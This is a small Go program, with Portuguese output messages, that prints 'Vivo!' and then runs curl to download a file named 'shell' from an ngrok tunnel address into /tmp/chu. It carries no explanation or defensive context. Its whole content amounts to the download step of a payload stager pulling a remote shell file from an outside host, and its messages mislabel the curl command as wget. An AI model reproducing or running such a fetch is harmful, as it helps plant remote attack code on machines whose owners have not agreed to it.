package main

import (
        "fmt"
        "os/exec"
)

func main() {
        fmt.Println("Vivo!")
        cmd := exec.Command("curl","https://8385-189-40-72-61.ngrok-free.app/shell","-o","/tmp/chu")

        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro ao executar o comando wget:", err)
        } else {
            fmt.Println("Saída do comando wget:", string(output))
        }
}
